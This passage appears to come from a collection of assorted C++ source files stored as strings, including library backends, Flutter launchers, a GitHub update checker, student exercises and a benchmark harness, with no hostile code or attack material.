*****************************************************************************/\n\n// memory leak test; sc_fxnum[_fast]_subref didn't have a destructor\n\n#define SC_INCLUDE_FX\n#include \"systemc.h\"\n\nint\nsc_main( int, char*[] )\n{\n    sc_bv<24> x;\n\n    for( int i = 0; i < 3000000; ++ i ) {\n        sc_fixed_fast<24,3> tmp_fx = 0.3;\n        x = (sc_bv_base) tmp_fx.range( 23, 0 );\n    }\n\n    return 0;\n}\n",
    "// dear imgui: Renderer Backend for DirectX11\n// This needs to be used along with a Platform Backend (e.g. Win32)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'ID3D11ShaderResourceView*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-05-19: DirectX11: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-02-18: DirectX11: Change blending equation to preserve alpha in output buffer.\n//  2019-08-01: DirectX11: Fixed code querying the Geometry Shader state (would generally error with Debug layer enabled).\n//  2019-07-21: DirectX11: Backup, clear and restore Geometry Shader is any is bound when calling ImGui_ImplDX10_RenderDrawData. Clearing Hull/Domain/Compute shaders without backup/restore.\n//  2019-05-29: DirectX11: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: DirectX11: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2018-12-03: Misc: Added #pragma comment statement to automatically link with d3dcompiler.lib when using D3DCompile().\n//  2018-11-30: Misc: Setting up io.BackendRendererName so it can be displayed in the About Window.\n//  2018-08-01: DirectX11: Querying for IDXGIFactory instead of IDXGIFactory1 to increase compatibility.\n//  2018-07-13: DirectX11: Fixed unreleased resources in Init and Shutdown functions.\n//  2018-06-08: Misc: Extracted imgui_impl_dx11.cpp/.h away from the old combined DX11+Win32 example.\n//  2018-06-08: DirectX11: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplDX11_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2016-05-07: DirectX11: Disabling depth-write.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_dx11.h\"\n\n// DirectX\n#include <stdio.h>\n#include <d3d11.h>\n#include <d3dcompiler.h>\n#ifdef _MSC_VER\n#pragma comment(lib, \"d3dcompiler\") // Automatically link with d3dcompiler.lib as we are using D3DCompile() below.\n#endif\n\n// DirectX11 data\nstruct ImGui_ImplDX11_Data\n{\n    ID3D11Device*               pd3dDevice;\n    ID3D11DeviceContext*        pd3dDeviceContext;\n    IDXGIFactory*               pFactory;\n    ID3D11Buffer*               pVB;\n    ID3D11Buffer*               pIB;\n    ID3D11VertexShader*         pVertexShader;\n    ID3D11InputLayout*          pInputLayout;\n    ID3D11Buffer*               pVertexConstantBuffer;\n    ID3D11PixelShader*          pPixelShader;\n    ID3D11SamplerState*         pFontSampler;\n    ID3D11ShaderResourceView*   pFontTextureView;\n    ID3D11RasterizerState*      pRasterizerState;\n    ID3D11BlendState*           pBlendState;\n    ID3D11DepthStencilState*    pDepthStencilState;\n    int                         VertexBufferSize;\n    int                         IndexBufferSize;\n\n    ImGui_ImplDX11_Data()       { memset((void*)this, 0, sizeof(*this)); VertexBufferSize = 5000; IndexBufferSize = 10000; }\n};\n\nstruct VERTEX_CONSTANT_BUFFER_DX11\n{\n    float   mvp[4][4];\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplDX11_Data* ImGui_ImplDX11_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplDX11_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nstatic void ImGui_ImplDX11_SetupRenderState(ImDrawData* draw_data, ID3D11DeviceContext* ctx)\n{\n    ImGui_ImplDX11_Data* bd = ImGui_ImplDX11_GetBackendData();\n\n    // Setup viewport\n    D3D11_VIEWPORT vp;\n    memset(&vp, 0, sizeof(D3D11_VIEWPORT));\n    vp.Width = draw_dat",
    "/*\r\nEstudiante: Juan David M\r\nProfesores: Ever Rojas y Oscar Ramirez\r\n\r\nDocumentaci\u00f3n:https://photos.app.goo.gl/KSCkdgmug1DckFCy7\r\n*/\r\n\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\n\r\nint main(){\r\n    cout<<\"Hola, profesores Ever y Oscar. Si est\u00e1n leyendo este c\u00f3digo es porque mi t\u00eda fue una buena\";\r\n    cout<<\"paloma mensajera (10/10). Les traje algunos obsequios peque\u00f1os de un viaje que tuve a la\";\r\n    cout<<\"Universidad Nacional de Rosario (UNR) en Argentina para una competencia de programaci\u00f3n en\";\r\n    cout<<\"la que estuve representando a la UNAL. Espero que sea de su agrado. No hay cosas materiales\";\r\n    cout<<\"que representen la infinita gratitud y admiraci\u00f3n que les he tenido desde que me formaron\";\r\n    cout<<\"cuando era ni\u00f1o en la programaci\u00f3n. Espero que el destino (Dios o lo que sea) me siga permitiendo\";\r\n    cout<<\"participar en m\u00e1s competencias de programaci\u00f3n. Si es as\u00ed, empeicen a acostumbrarse :),\";\r\n    cout<<\"porque les estar\u00e9 mandando peque\u00f1os obsequios de los viajes a los cert\u00e1menes de programaci\u00f3n\";\r\n    cout<<\"que el destino me permita vivir fuera del pa\u00eds.\";\r\n    cout<<\"Gracias totales. (Lease hasta el final)\";\r\n    cout<<\"                                                                   |>>>\";\r\n    cout<<\"                           _                      _                |\";\r\n    cout<<\"            ____________ .| |.    _____/----/-\\ .| |./========\\   / \";\r\n    cout<<\"           //// ////// /V_.-._\\  |.-.-.|===| _ |-----| u    u |  /___\\\";\r\n    cout<<\"          // /// // ///==\\ u |.  || | ||===||||| |T| |   ||   | .| u |_ _ _ _ _ _\";\r\n    cout<<\"         ///////-\\////====\\==|:::::::::::::::::::::::::::::::::::|u u| U U U U U\";\r\n    cout<<\"         |----/\\u |--|++++|..|'''''''''''::::::::::::::''''''''''|+++|+-+-+-+-+-+\";\r\n    cout<<\"         |u u|u | |u ||||||..|              '::::::::'           |===|>=== _ _ ==\";\r\n    cout<<\"         |===|  |u|==|++++|==|              .::::::::.           | T |....| V |..\";\r\n    cout<<\"         |u u|u | |u ||HH||         \\|/    .::::::::::.\";\r\n    cout<<\"         |===|_.|u|_.|+HH+|_              .::::::::::::.              _\";\r\n    cout<<\"                        __(_)___         .::::::::::::::.         ___(_)__\";\r\n    cout<<\"        ---------------/  / \\  /|       .:::::;;;:::;;:::.       |\\  / \\  \\-------\";\r\n    cout<<\"        ______________/_______/ |      .::::::;;:::::;;:::.      | \\_______\\________\";\r\n    cout<<\"        |       |     [===  =] /|     .:::::;;;::::::;;;:::.     |\\ [==  = ]   |\";\r\n    cout<<\"        |_______|_____[ = == ]/ |    .:::::;;;:::::::;;;::::.    | \\[ ===  ]___|____\";\r\n    cout<<\"             |       |[  === ] /|   .:::::;;;::::::::;;;:::::.   |\\ [=  ===] |\";\r\n    cout<<\"        _____|_______|[== = =]/ |  .:::::;;;::::::::::;;;:::::.  | \\[ ==  =]_|______\";\r\n    cout<<\"         |       |    [ == = ] /| .::::::;;:::::::::::;;;::::::. |\\ [== == ]      |\";\r\n    cout<<\"        _|_______|____[=  == ]/ |.::::::;;:::::::::::::;;;::::::.| \\[  === ]______|_\";\r\n    cout<<\"           |       |  [ === =] /.::::::;;::::::::::::::;;;:::::::.\\ [===  =]   |\";\r\n    cout<<\"        ___|_______|__[ == ==]/.::::::;;;:::::::::::::::;;;:::::::.\\[=  == ]___|_____\";\r\n\r\n    cout<<\"Postdata: Disc\u00falpeme profesor Oscar por no haberme comunicado con usted para la continuaci\u00f3n del proyecto.\";\r\n    cout<<\"Lastimosamente fue un fracaso, todos los ni\u00f1os solo copiaban c\u00f3digo de chatGPT y era muy desgastante para m\u00ed\";\r\n    cout<<\"preparar todo y ver que ellos no ten\u00edan el inter\u00e9s de aprender.\";\r\n    cout<<\"Juan David...\";\r\n}\r\n",
    "#include<iostream>\nusing namespace std;\n\n//----------------------------------------------------------QUES 01 \n// //array as a parameter and it's size \n// void createArray(int arr[], int &size){\n//     cout << \"enter array size: \"; \n//     cin >> size;\n//     cout << \"Enter\" << size << \"element: \";\n//     for(int i=0; i<size; i++){\n//         cin >> arr[i];\n//     }\n// }\n\n// void displayArray(int arr[], int size){\n//     cout << \"Array elements are: \";\n//     for(int i=0; i<size; i++){\n//         cout << arr[i] << \" \";\n//     }\n\n//     cout << endl;\n// }\n\n\n\n\n// void insertElement(int arr[], int &size){\n//     int ele, pos;\n//     cout << \"Enter element to be inserted: \";\n//     cin >> ele;\n//     cout << \"enter position: \";\n//     cin >> pos;\n\n//     for(int i=size; i>pos; i--){\n//         arr[i]=arr[i-1];\n//     }\n//     arr[pos]= ele;\n//     size++;\n//     cout << \"success\" << endl;\n// }\n\n// void deleteElement(int arr[], int &size){\n//     int pos;\n//     cout << \"enter position: \" << endl;\n//     cin >> pos;\n\n//     for(int i=pos; i<size-1; i++){\n//         arr[i]=arr[i+1];\n//     }\n\n//     size--;\n//     cout << \"Element deleted!\" << endl;\n// }\n\n\n// int binarySearch(int arr[], int size){\n//     int start=0;\n//     int end= size-1;\n\n//     int ele;\n//     cout << \"enetr element to search\" << endl;\n//     cin >> ele;\n\n//     while(start <= end){\n        \n//         int mid= start + (end-start)/2;\n\n//         if(arr[mid] < ele){\n//             start= mid+1; \n//         }\n\n//         else if(arr[mid] > ele){\n//             end= mid-1;\n//         }\n\n//         else if(arr[mid] == ele){\n//             return mid;\n//         }\n//     }\n\n//     return -1;\n// }\n\n\n// int linearSearch(int arr[], int size){\n//     int ele;\n//     cout << \"enter element: \"; \n//     cin >> ele;\n\n//     for(int i=0; i<size; i++){\n//         if(arr[i]==ele){\n//             return i;\n//         }\n//     }\n//     return -1;\n// }\n\n\n\n\n\n\n\n// int main(){\n    \n//     int arr[100];\n//     int size = 0;\n//     int choice; \n\n//      do {\n//         cout << \"\\n----MENU----\\n\";\n//         cout << \"1. CREATE\\n\";\n//         cout << \"2. DISPLAY\\n\";\n//         cout << \"3. INSERT\\n\";\n//         cout << \"4. DELETE\\n\";\n//         cout << \"5. BINARY SEARCH\\n\";\n//         cout << \"6. LINEAR SEARCH\\n\";\n//         cout << \"7. EXIT\\n\";\n//         cout << \"Enter your choice: \";\n//         cin >> choice;\n\n//         switch (choice) {\n//             case 1:\n//                 createArray(arr, size);\n//                 break;\n//             case 2:\n//                 displayArray(arr, size);\n//                 break;\n//             case 3:\n//                 insertElement(arr, size);\n//                 break;\n//             case 4:\n//                 deleteElement(arr, size);\n//                 break;\n//             case 5: {\n//                 int result = binarySearch(arr, size);\n//                 if (result != -1) {\n//                     cout << \"Element found at index \" << result << endl;\n//                 } else {\n//                     cout << \"Element not found in the array.\" << endl;\n//                 }\n//                 break;\n//             }\n//             case 6: {\n//                 int result = linearSearch(arr, size);\n//                 if (result != -1) {\n//                     cout << \"Element found at index \" << result << endl;\n//                 } else {\n//                     cout << \"Element not found in the array.\" << endl;\n//                 }\n//                 break;\n//             }\n//             case 7:\n//                 cout << \"Exiting the program.\" << endl;\n//                 break;\n//         }\n//     } while (choice != 7);\n\n//     return 0;\n// }\n\n//--------------------------------------------------------------------- QUES02\n\n// void removeDuplicate(int arr[], int &size){\n\n//     int uniqueSize=0; //say after removing duplicate elements \n//     int uniqueArr[size]; //to hold unique elements \n\n//     for(int i=0; i <size; i++){\n//         bool isDuplicate= false;\n\n//         for(int j=0; j<uniqueSize; j++){\n//             if(arr[i] == uniqueArr[j]){\n//                 isDuplicate= true;\n//                 break;\n//             }\n//         }\n\n//         if(!isDuplicate){\n//             uniqueArr[uniqueSize]= arr[i];\n//             uniqueSize++;\n//         }\n//     }\n\n// }\n\n/*\nvoid removeDuplicate(int arr[], int &size){\n\n    int tempArray[size];\n    int tempSize=0;\n\n//------------------------------------\n    for(int i=0; i<size; i++){\n\n        bool duplicateNumb = false; \n\n        for(int j=0; j<tempSize; j++){\n            if(arr[i] == tempArray[j]){\n               duplicateNumb = true; \n            }\n        }\n\n        if(!duplicateNumb){\n            tempArray[tempSize]= arr[i];\n            tempSize++;\n        }\n    }\n//---------------------------------------\n\n  for(int i=0; i<tempSize; i++){\n     arr[i]= tempArray[i];\n  }\n\n    size= tempSize;\n\n}\n\n\n\nint main(){\n    int arr[]= {1,2,3,4,2,5,1,6,7,8,7,9};\n    int size = sizeof(arr",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"brick_breaker\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todoapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"rfu.h\"\n\n#include <Windows.h>\n\n#pragma comment(lib, \"WinInet.lib\")\n#include <WinInet.h>\n\n#include <string>\n#include <regex>\n\nbool HttpRequest(const char *url, std::string &response)\n{\n\tif (HINTERNET internet = InternetOpenA(\"axstin/rbxfpsunlocker\", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL))\n\t{\n\t\tif (HINTERNET request = InternetOpenUrlA(internet, url, NULL, 0, INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_CACHE_WRITE, NULL))\n\t\t{\n\t\t\tchar buffer[1024];\n\t\t\tDWORD bytes_read;\n\n\t\t\twhile (InternetReadFile(request, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0)\n\t\t\t{\n\t\t\t\tresponse.append(buffer, bytes_read);\n\t\t\t}\n\n\t\t\tInternetCloseHandle(internet);\n\t\t\tInternetCloseHandle(request);\n\t\t\treturn true;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tInternetCloseHandle(internet);\n\t\t\treturn false;\n\t\t}\n\t}\n\n\treturn false;\n}\n\nbool RFU::CheckForUpdates()\n{\n\tstd::string response;\n\tif (!HttpRequest(\"https://api.github.com/repos/\" RFU_GITHUB_REPO \"/releases/latest\", response))\n\t{\n\t\tMessageBoxA(NULL, \"Failed to connect to Github\", \"Update Check\", MB_OK);\n\t\treturn false;\n\t}\n\n\tstd::smatch matches;\n\tstd::regex_search(response, matches, std::regex(R\"x(\"tag_name\":\\s*\"v?([^\"]+))x\")); // \"tag_name\":\\s*\"v?(.+)\"\n\n\tif (matches.size() <= 1)\n\t{\n\t\tprintf(\"Response: %s\\n\", response.c_str());\n\t\tMessageBoxA(NULL, \"Invalid response\", \"Update Check\", MB_OK);\n\t\treturn false;\n\t}\n\n\tstd::string latest_version = matches[1].str();\n\n\tif (latest_version != RFU_VERSION)\n\t{\n\t\tchar buffer[256];\n\t\tsprintf_s(buffer, \"A new version of Roblox FPS Unlocker is available.\\n\\nCurrent Version: %s\\nLatest Version: %s\\n\\nVisit download page?\", RFU_VERSION, latest_version.c_str());\n\n\t\tif (MessageBoxA(NULL, buffer, \"Update Check\", MB_YESNOCANCEL | MB_ICONEXCLAMATION) == IDYES)\n\t\t{\n\t\t\tShellExecuteA(NULL, \"open\", \"https://github.com/\" RFU_GITHUB_REPO \"/releases\", NULL, NULL, SW_SHOWNORMAL);\n\t\t\treturn true;\n\t\t}\n\t}\n\n\treturn false;\n}",
    "#include <iostream>\r\n#include <typeinfo>\r\n#include<string>\r\n#include<vector>\r\n#include <initializer_list>\r\n#include<stdexcept>\r\n#include<cassert>//\u9884\u5904\u7406\u5b8f\r\n#include\"test.h\"\r\n\r\nusing std::cout;\r\nusing std::cin;\r\nusing std::endl;\r\nusing std::istream;\r\nusing std::string;\r\nusing std::vector;\r\nusing std::initializer_list;\r\ntypedef string::size_type sz;\r\n\r\nint xyz()\r\n{\r\n\tstatic int a = -1;\r\n\treturn ++a;\r\n}\r\n\r\nvoid diaohuan(int* i, int* j)\r\n{\r\n\tint a;\r\n\ta = *i;\r\n\t*i = *j;\r\n\t*j = a;\r\n}\r\n\r\nvoid diaohuan_1(int &i, int &j)\r\n{\r\n\tint a;\r\n\ta = i;\r\n\ti = j;\r\n\tj = a;\r\n}\r\n\r\nsize_t find_char(const string& a, char b, size_t& c)\r\n{\r\n\tauto ret = a.size();\r\n\tc = 0;\r\n\tfor (decltype(ret)i = 0; i != a.size(); i++)\r\n\t{\r\n\t\tif (a[i] == b)\r\n\t\t{\r\n\t\t\tif (ret == a.size())\r\n\t\t\t\tret = i;\r\n\t\t\t++c;\r\n\t\t}\r\n\t}\r\n\treturn ret;\r\n}\r\n\r\nint daxie(const string& a)\r\n{\r\n\tfor (auto i = a.begin(); i != a.end(); i++)\r\n\t\tif (isupper(*i))\r\n\t\t{\r\n\t\t\treturn 1;\r\n\t\t}\r\n\treturn 0;\r\n}\r\n\r\nvoid bianxiaoxie(string& a)\r\n{\r\n\tfor (auto i = a.begin(); i != a.end(); i++)\r\n\t\t*i = tolower(*i);\r\n}\r\n\r\nint daxiao(int a, int* b)\r\n{\r\n\tif (a > *b)\r\n\t\treturn a;\r\n\telse\r\n\t\treturn *b;\r\n}\r\n\r\nvoid jiaohuan_zhizhen(int*& a, int*& b)\r\n{\r\n\tint *i = a;\r\n\ta = b;\r\n\tb = i;\r\n}\r\n\r\nvoid print(int(&a)[2])\r\n{\r\n\tfor (auto b : a)\r\n\t\tcout << b << endl;\r\n}\r\n\r\nvoid msg(initializer_list<string> a)\r\n{\r\n\tfor (auto x = a.begin(); x != a.end(); ++x)\r\n\t\tcout << *x << endl;\r\n}\r\n\r\nint sum_int(initializer_list<int> a)\r\n{\r\n\tint i = 0;\r\n\tfor (auto x = a.begin(); x != a.end(); ++x)\r\n\t\ti += *x;\r\n\treturn i;\r\n}\r\n\r\nchar &get_val(string& str, rsize_t ix)//\u8fd9\u4e2a&\u7b26\u53f7\u4ee3\u8868\u8fd4\u56de\u7684\u7c7b\u578b\u662fchar &\uff0c\u662f\u5f15\u7528\u7c7b\u578b\uff0c\u53ef\u4ee5\u4fee\u6539\u7684\r\n{\r\n\treturn str[ix];\r\n}\r\n\r\nbool str_subrange(const string& str1, const string& str2)\r\n{\r\n\tif (str1.size() == str2.size())\r\n\t\treturn str1 == str2;\r\n\tauto size = (str1.size() < str2.size()) ? str1.size() : str2.size();\r\n\tfor (decltype(size)i = 0; i != size; ++i)\r\n\t{\r\n\t\tif (str1[i] != str2[i])\r\n\t\t\treturn i;\r\n\t}\r\n}\r\n\r\nvoid fac(vector<int>x,unsigned y)\r\n{\r\n\tunsigned vz = x.size();\r\n\tif (!x.empty() && y < vz)\r\n\t{\r\n\t\tcout << x[y] << endl;\r\n\t\tfac(x, y + 1);\r\n\t}\r\n}\r\n\r\nstring(&funct(int i))[10]\r\n{\r\n\t\tstring a[10] = { \"f\"};\r\n\t\treturn a;\r\n}\r\n\r\nusing act = string[10];\r\nact& funct_1(int i)\r\n{\r\n\tstring a[10] = { \"f\" };\r\n\treturn a;\r\n}\r\n\r\nauto funct_2(int i) -> string(&)[10]\r\n\t{\r\n\t\tstring a[10] = { \"f\" };\r\n\t\treturn a;\r\n\t}\r\n\r\nstring biemingtest[10] = { \"f\" };\r\ndecltype(biemingtest)& funct_3(int i)\r\n{\r\n\tstring a[10] = { \"f\" };\r\n\treturn a;\r\n}\r\n\r\nstring make_plural(size_t ctr, const string& word, const string& ending)\r\n{\r\n\treturn (ctr > 1) ? word + ending : word;\r\n}\r\n\r\nvoid factorial(vector<int>x,unsigned index)\r\n{\r\n\tunsigned i = x.size();\r\n\tif (!x.empty() && index != i)\r\n\t{\r\n\t\tcout << x[index] << endl;\r\n\t\tfactorial(x, ++index);\r\n\t}\r\n}\r\n\r\nint add(int a, int b)\r\n{\r\n\treturn a + b;\r\n}\r\n\r\nint sub(int a, int b)\r\n{\r\n\treturn a - b;\r\n}\r\n\r\nint mult(int a, int b)\r\n{\r\n\treturn a * b;\r\n}\r\n\r\nint divide(int a, int b)\r\n{\r\n\treturn a / b;\r\n}\r\n\r\n//Person\u7c7b\u7684\u8f93\u5165\u548c\u8f93\u51fa\u51fd\u6570\r\nistream& read(istream& is, Person& item)\r\n{\r\n\tis >> item.Name >> item.Address;\r\n\treturn is;\r\n}\r\nostream& print(ostream& os, const Person& item)\r\n{\r\n\tos << item.re_name() << item.re_address();\r\n\treturn os;\r\n}",
    "#include \"./bench_template.hpp\"\n#include \"../hourglass.cpp\"\n\n\ninline std::vector<std::pair<uint64_t, uint64_t>> SampleQueries(std::vector<std::pair<uint64_t, uint64_t>> queries, double sample_rate) {\n    std::vector<std::pair<uint64_t, uint64_t>> sample_queries;\n\n    std::mt19937 generator(std::random_device{}());\n    std::shuffle(queries.begin(), queries.end(), generator);\n    auto sample_size = queries.size() * sample_rate;\n    \n    for (size_t i = 0; i < sample_size; i++)\n    {\n        sample_queries.push_back(queries[i]);\n    }\n    return sample_queries;\n}\n\ntemplate <typename t_itr>\ninline int EsitimateCorrDegree(const t_itr begin, const t_itr end, std::vector<std::pair<uint64_t, uint64_t>> queries, size_t range_size) {\n    auto interval = 1 << range_size;\n    uint64_t corr = 0;\n    for (auto pair : queries)\n    {\n        auto l = pair.first;\n        auto r = pair.second;\n\n        uint64_t distance = 0;\n        auto low = std::lower_bound(begin, end, l);\n        if (low == end) {\n            distance = l - *(end - 1);\n        } else {\n            distance = min(l - *(low - 1), *low - r);\n        }\n        if (distance <= interval)\n            corr++;\n    }\n    if (corr == 0)\n        return 0;\n    auto D = 1 - std::log2(queries.size() / (double) corr * interval) / 30;\n    return std::round(D * 10);\n} \n\ntemplate <typename t_itr, typename... Args>\ninline Hourglass init_hourglass(const t_itr begin, const t_itr end, const double bpk, Args... args)\n{\n    auto&& t = std::forward_as_tuple(args...);\n    auto queries_temp = std::get<0>(t);\n    auto max_range_size = std::get<1>(t);\n\n    auto queries = std::vector<std::pair<uint64_t, uint64_t>>(queries_temp.size());\n    std::transform(queries_temp.begin(), queries_temp.end(), queries.begin(), [](auto x) {\n        auto [left, right, result] = x;\n        return std::make_pair(left, right);\n    });\n\n    auto sample_queries = SampleQueries( queries, 0.2);\n    start_timer(modelling_time);\n    auto D = EsitimateCorrDegree(begin, end, sample_queries, max_range_size);\n    stop_timer(modelling_time);\n    start_timer(build_time);\n    Hourglass f(begin, end, max_range_size, D * 0.1, bpk);\n    stop_timer(build_time);\n    return f;\n}\n\ntemplate <typename value_type>\ninline bool query_hourglass(Hourglass &f, const value_type left, const value_type right)\n{\n    return f.Lookup_Adaptive(left, right);\n}\n\n\ninline size_t size_hourglass(Hourglass &f)\n{\n    return f.size() >> 3;\n}\n\nint main(int argc, char const *argv[])\n{\n    argparse::ArgumentParser parser(\"bench-hourglass\");\n    init_parser(parser);\n    try\n    {\n        parser.parse_args(argc, argv);\n    }\n    catch (const std::exception& err)\n    {\n        std::cerr << err.what() << std::endl;\n        std::cerr << parser;\n        std::exit(1);\n    }\n\n    auto [ keys, queries, arg , range_size, corr_degree ] = read_parser_arguments(parser);\n    experiment(pass_fun(init_hourglass),pass_ref(query_hourglass),\n               pass_ref(size_hourglass), arg, keys, queries, queries, range_size);\n    print_test();\n\n    return 0;\n}",
    "#include \"VMWriter.h\"\n#include <iostream>\n#include <fstream>\n#include <string>\nusing namespace std;\n\nVMWriter::VMWriter(string fileName)\n{\n\tfout_.open(fileName.c_str());\n}\n\nvoid VMWriter::close(void)\n{\n\tif(fout_.is_open())\n\t\tfout_.close();\n}\n\nvoid VMWriter::writePush(vm::Segment segment, int index)\n{\n\tfout_ << \"push \" << vm::segment2String(segment) << \" \" << index << endl;\n}\n\nvoid VMWriter::writePop(vm::Segment segment, int index)\n{\n\tfout_ << \"pop \" << vm::segment2String(segment) << \" \" << index << endl;\n}\n\nvoid VMWriter::writeArithmetic(vm::Command command)\n{\n\tfout_ << vm::command2String(command) << endl;\n}\n\nvoid VMWriter::writeLabel(string label)\n{\n\tfout_ << \"label \" << label << endl;\n}\n\nvoid VMWriter::writeGoto(string label)\n{\n\tfout_ << \"goto \" << label << endl;\n}\n\nvoid VMWriter::writeIf(string label)\n{\n\tfout_ << \"if-goto \" << label << endl;\n}\n\nvoid VMWriter::writeCall(string name, int nArgs)\n{\n\tfout_ << \"call \" << name << \" \" << nArgs << endl;\n}\n\nvoid VMWriter::writeFunction(string name, int nLocals)\n{\n\tfout_ << \"function \" << name << \" \" << nLocals << endl;\n}\n\nvoid VMWriter::writeReturn(void)\n{\n\tfout_ << \"return\" << endl;\n}",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <fstream>\r\n#include <filesystem>\r\n/*\r\n\r\n    This code snippet is a C++ program that implements a basic to-do list application. It allows the user to perform various operations on a text file, such as adding, updating, and deleting tasks.\r\n\r\n    Here's a high-level overview of the code:\r\n\r\n    The program starts by creating a file stream object and a vector to store user tasks.\r\n    It prompts the user to choose whether they want to check for existing .txt files.\r\n    If the user chooses to check for files, the program prompts the user to enter a file name.\r\n    If the file exists, the program prompts the user to choose an operation (Add, Update, or Delete).\r\n    Depending on the chosen operation, the program performs the corresponding action (adding a new task, updating an existing task, or deleting a task).\r\n    If the user chooses not to check for files, the program prompts the user to enter the number of tasks and a file name.\r\n    The program then prompts the user to enter each task and saves them to the file.\r\n    After the user has finished adding tasks, the program prompts the user to choose whether they want to update or delete any tasks.\r\n    If the user chooses to update tasks, the program prompts the user to select a task to update and asks for the new task.\r\n    If the user chooses to delete tasks, the program prompts the user to select a task to delete.\r\n    Finally, the program displays the updated or deleted tasks and exits.\r\n    The code snippet includes error handling and input validation to ensure that the program runs smoothly and handles user input correctly.\r\n\r\n*/\r\nstd::string UPDATE = \"Update\";\r\nstd::string DELETE = \"Delete\";\r\n\r\nint main()\r\n{\r\n    // Create a file stream object\r\n    std::ofstream file;\r\n    std::vector<std::string> User_Tasks_Vector;\r\n    std::cout << \"== WELCOME TO MY BASIC TO-DO LIST ==\" << \"\\n\";\r\n    std::cout << \"- - - - - - - - - - - -\" << \"\\n\";\r\n    std::string User_Answer = \"\";\r\n    int RESULT_ERROR_REASON = -1;\r\n    std::cout << \"Do You Want to Check For .txt Files (Yes | No) : \";\r\n    std::cin >> User_Answer;\r\n    std::cin.ignore();\r\n\r\n    std::cout << \"User Answer: \" << User_Answer << std::endl;\r\n\r\n    if (User_Answer == \"Yes\")\r\n    {\r\n        std::string File_Name = \"\";\r\n        std::cout << \"Enter File Name (File_Name.txt) : \";\r\n        std::getline(std::cin, File_Name);\r\n\r\n        std::cout << \"File Name: \" << File_Name << std::endl;\r\n\r\n        if 